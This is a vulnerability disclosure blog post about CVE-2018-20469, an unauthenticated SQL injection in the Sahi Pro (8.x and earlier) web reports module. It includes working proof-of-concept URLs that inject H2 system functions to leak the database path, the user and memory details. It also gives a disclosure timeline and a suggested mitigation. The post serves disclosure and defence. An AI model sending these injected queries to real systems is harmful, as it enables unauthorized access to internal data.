# CVE-2018-20469 – Sahi pro ( <= 8.x ) SQL Injection

June 11, 2019
[goutham madhwaraj](https://barriersec.com/author/goutham/ "Posts by goutham madhwaraj")

An issue was discovered in Tyto Sahi Pro ( <= 8.x )

A parameter in the web reports module is vulnerable to  SQL injection. This can be exploited to inject SQL queries and run standard h2 system functions.

It was found in sahi reports web interface,whenever we search for a particular report using search field , direct sql query was passed as part of GET request. This query can be manipulated to dump internal details such as database name ,database path , read files using h2 system functions , user details , schema details and other critical information related to the internals of sahi database to external adversary  on same network.

Proof of concept :

![](https://barriersec.com/wp-content/uploads/sql_injection_3.png)

**Fig 1 : sql query is directly passed as part of GET request**

Sahi web reports interface allows an end user to search for a report based on its name. This user supplied parameter is converted into a SQL query and is directly passed as part of URL as shown in figure 1.

As sahi is using **H2 database** to store the reports and other data, an end user can exploit this scenario to run **h2 database system functions**by manipulating the passed SQL query .

![](https://barriersec.com/wp-content/uploads/sql_injection_5.png)

**Fig 2 : leak of memory used by sahi application ( memory\_used() )**

**Modified URL :**

**http://localhost:9999/\_s\_/dyn/pro/DBReports?sql=SELECT DISTINCT memory\_used() AS ROWSTATUS, SCRIPTREPORTS.SCRIPTREPORTID,SCRIPTREPORTS.SCRIPTNAME,SUITEREPORTS.\* FROM SUITEREPORTS,SCRIPTREPORTS**

![](https://barriersec.com/wp-content/uploads/sql_injection_4.png)

**Fig 3 : leak of database path by sahi application ( database\_path() )**

**Modified URL:**

**http://localhost:9999/\_s\_/dyn/pro/DBReports?sql=SELECT DISTINCT database\_path() AS ROWSTATUS, SCRIPTREPORTS.SCRIPTREPORTID,SCRIPTREPORTS.SCRIPTNAME,SUITEREPORTS.\* FROM SUITEREPORTS,SCRIPTREPORTS**

![](https://barriersec.com/wp-content/uploads/sql_injection_2.png)

**Fig 4 : leak of current database user by sahi application ( user() )**

**Modified URL:**

**http://localhost:9999/\_s\_/dyn/pro/DBReports?sql=SELECT DISTINCT user() AS ROWSTATUS, SCRIPTREPORTS.SCRIPTREPORTID,SCRIPTREPORTS.SCRIPTNAME,SUITEREPORTS.\* FROM SUITEREPORTS,SCRIPTREPORTS**

All h2 system functions can be used to abuse and leak more sensitive  information by un-authenticated user .

Disclosure timeline :

disclosed on : 8/ December / 2018

suggested quick fix till the official patch is released : password protect web reports module

Affected versions : all versions of **sahi pro ( <= 8.x ) (web application automation )**

**vendor website** :  https://sahipro.com/
